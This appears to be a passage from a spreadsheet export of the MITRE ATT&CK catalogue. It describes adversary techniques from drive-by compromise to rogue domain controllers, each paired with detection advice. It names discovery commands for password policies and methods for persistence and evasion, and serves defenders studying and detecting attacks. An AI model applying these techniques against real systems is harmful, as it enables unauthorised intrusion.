Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)</t>
  </si>
  <si>
    <t>Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.
Network intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.
Detecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.</t>
  </si>
  <si>
    <t>T1190</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.
Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).
If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.
Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)
For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)</t>
  </si>
  <si>
    <t>Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.</t>
  </si>
  <si>
    <t>T1195</t>
  </si>
  <si>
    <t>File: File Metadata, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>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Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) 
* Replacement of legitimate software with modified versions
* Sales of modified/counterfeit products to legitimate distributors
* Shipment interdiction
While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)</t>
  </si>
  <si>
    <t>Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.</t>
  </si>
  <si>
    <t>T1195.001</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  
Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. </t>
  </si>
  <si>
    <t xml:space="preserve">Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. </t>
  </si>
  <si>
    <t>T1195.002</t>
  </si>
  <si>
    <t xml:space="preserve">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
Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  </t>
  </si>
  <si>
    <t>T1195.003</t>
  </si>
  <si>
    <t>Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.</t>
  </si>
  <si>
    <t>Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.</t>
  </si>
  <si>
    <t>T1197</t>
  </si>
  <si>
    <t>Defense Evasion, Persistence</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation, Service: Service Metadata</t>
  </si>
  <si>
    <t>Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.
The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)
Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)
BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)</t>
  </si>
  <si>
    <t>BITS runs as a service and its status can be checked with the Sc query utility (&lt;code&gt;sc query bits&lt;/code&gt;).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (&lt;code&gt;bitsadmin /list /allusers /verbose&lt;/code&gt;).(Citation: Microsoft BITS)
Monitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)
Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)</t>
  </si>
  <si>
    <t>T1199</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.
Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)
In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)</t>
  </si>
  <si>
    <t>Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.</t>
  </si>
  <si>
    <t>T1200</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Drive: Drive Creation, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.
While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)</t>
  </si>
  <si>
    <t>Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. 
Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.</t>
  </si>
  <si>
    <t>T1201</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, User Account: User Account Metadata</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Linux, Network, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).
Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as &lt;code&gt;net accounts (/domain)&lt;/code&gt;, &lt;code&gt;Get-ADDefaultDomainPasswordPolicy&lt;/code&gt;, &lt;code&gt;chage -l &lt;username&gt;&lt;/code&gt;, &lt;code&gt;cat /etc/pam.d/common-password&lt;/code&gt;, and &lt;code&gt;pwpolicy getaccountpolicies&lt;/code&gt; (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. &lt;code&gt;show aaa&lt;/code&gt;, &lt;code&gt;show aaa common-criteria policy all&lt;/code&gt;).(Citation: US-CERT-TA18-106A)
Password policies can be discovered in cloud environments using available APIs such as &lt;code&gt;GetAccountPasswordPolicy&lt;/code&gt; in AWS (Citation: AWS GetPasswordPolicy).</t>
  </si>
  <si>
    <t>Monitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.</t>
  </si>
  <si>
    <t>T1202</t>
  </si>
  <si>
    <t>Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), Scriptrunner.exe, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe)
Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.</t>
  </si>
  <si>
    <t>Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)</t>
  </si>
  <si>
    <t>T1203</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Modification, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.
Several types exist:
### Browser-based Exploitation
Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.
### Office Applications
Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.
### Common Third-party Applications
Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.</t>
  </si>
  <si>
    <t>Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.</t>
  </si>
  <si>
    <t>T1204</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, File: File Creation, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation</t>
  </si>
  <si>
    <t>Containers, IaaS, Linux, Windows, macOS</t>
  </si>
  <si>
    <t>An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).
While [User Execution](https://attack.mitre.org/techniques/T1204)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
Adversaries may also deceive users into performing actions such as:
* Enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary
* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)
* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)
For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)</t>
  </si>
  <si>
    <t>Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.
Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).</t>
  </si>
  <si>
    <t>T1204.001</t>
  </si>
  <si>
    <t>File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>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vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).</t>
  </si>
  <si>
    <t>Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.
Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.</t>
  </si>
  <si>
    <t>T1204.002</t>
  </si>
  <si>
    <t>File: File Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>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Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.
Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 
While [Malicious File](https://attack.mitre.org/techniques/T1204/002)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t>
  </si>
  <si>
    <t>Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.
Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).</t>
  </si>
  <si>
    <t>T1204.003</t>
  </si>
  <si>
    <t>Malicious Image (T1204.003)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start</t>
  </si>
  <si>
    <t>Containers, IaaS</t>
  </si>
  <si>
    <t>Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)
Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)</t>
  </si>
  <si>
    <t>Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.</t>
  </si>
  <si>
    <t>T1205</t>
  </si>
  <si>
    <t>Command and Control, Defense Evasion, Persistence</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>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 task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.
Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).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
On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.
Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)</t>
  </si>
  <si>
    <t>Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.
The Wake-on-LAN magic packet consists of 6 bytes of &lt;code&gt;FF&lt;/code&gt; followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)</t>
  </si>
  <si>
    <t>T1205.001</t>
  </si>
  <si>
    <t>Port Knocking (T1205.001)</t>
  </si>
  <si>
    <t>Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.
This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.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t>
  </si>
  <si>
    <t>Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.</t>
  </si>
  <si>
    <t>T1205.002</t>
  </si>
  <si>
    <t>Socket Filters (T1205.002)</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.
To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)
Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.</t>
  </si>
  <si>
    <t>Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters)</t>
  </si>
  <si>
    <t>T1207</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Network Traffic: Network Traffic Content, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.
Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)
This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)</t>
  </si>
  <si>
    <t>Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)
Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)
Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)
Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.</t>
  </si>
  <si>
    <t>T1210</t>
  </si>
  <si>
    <t>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to enable access to a remote system.
An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.
There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)
Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.</t>
  </si>
  <si>
    <t>Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of [Discovery](https://attack.mitre.org/tactics/TA0007), or other unusual network traffic that may indicate additional tools transferred to the system.</t>
  </si>
  <si>
    <t>T1211</t>
  </si>
  <si>
    <t>IaaS, Linux, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.
Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.
There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)</t>
  </si>
  <si>
    <t>Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.</t>
  </si>
  <si>
    <t>T1212</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Process: Process Creation, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>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 
